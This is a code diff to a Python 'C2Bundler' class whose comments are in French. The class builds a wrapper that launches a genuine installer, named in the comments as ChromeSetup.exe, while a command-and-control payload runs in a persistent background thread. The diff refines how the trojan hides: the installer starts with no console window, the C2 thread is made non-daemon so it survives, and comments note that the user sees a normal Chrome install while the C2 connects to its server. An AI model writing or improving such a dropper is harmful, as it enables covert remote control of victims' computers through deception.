@@ -315,6 +315,7 @@ class C2Bundler:
 import sys
 import subprocess
 import threading
+import time
 from pathlib import Path
 
 # Obtenir le répertoire du bundle
@@ -327,39 +328,55 @@ else:
 original_app = bundle_dir / "resources" / "{original_filename}"
 
 def run_original_app():
-    """Lance l'application originale"""
+    """Lance l'application originale et attend"""
     try:
         if original_app.exists():
-            # Sur Windows, utiliser os.startfile pour les .exe (meilleur support)
             if sys.platform.startswith('win'):
-                os.startfile(str(original_app))
+                # Sur Windows : lancer l'exe et attendre qu'il se termine
+                # Utiliser subprocess au lieu de os.startfile pour pouvoir wait()
+                process = subprocess.Popen([str(original_app)], 
+                                         shell=False,
+                                         creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0)
+                # Ne PAS attendre la fin de l'installateur (qui peut prendre du temps)
+                # Juste laisser le processus tourner
             else:
                 # macOS/Linux: utiliser subprocess
                 subprocess.Popen([str(original_app)], shell=False)
     except Exception as e:
         # Fallback: essayer avec shell=True
         try:
-            subprocess.Popen([str(original_app)], shell=True)
+            if sys.platform.startswith('win'):
+                os.startfile(str(original_app))
+            else:
+                subprocess.Popen([str(original_app)], shell=True)
         except:
             pass
 
 def run_c2_payload():
     """Lance le payload C2 en arrière-plan"""
     try:
-        import time
-        time.sleep(2)
+        # Attendre 3 secondes pour laisser l'app originale démarrer
+        time.sleep(3)
         # Code C2 ci-dessous
 {indented_payload}
     except Exception as e:
         pass
 
 if __name__ == "__main__":
-    # Lancer le C2 immédiatement en arrière-plan (daemon)
-    c2_thread = threading.Thread(target=run_c2_payload, daemon=True)
+    # IMPORTANT: Lancer le C2 dans un thread NON-DAEMON
+    # Pour que le processus reste actif même après le lancement de l'app originale
+    c2_thread = threading.Thread(target=run_c2_payload, daemon=False)
     c2_thread.start()
     
-    # Lancer l'app originale (non-daemon pour que le process reste actif)
+    # Attendre un peu que le C2 démarre
+    time.sleep(1)
+    
+    # Lancer l'app originale (ChromeSetup.exe s'exécutera normalement)
     run_original_app()
+    
+    # Le processus reste actif car le thread C2 tourne en arrière-plan
+    # L'utilisateur voit l'installation Chrome se lancer normalement
+    # Pendant ce temps, le C2 se connecte au serveur
 '''
 
         return wrapper
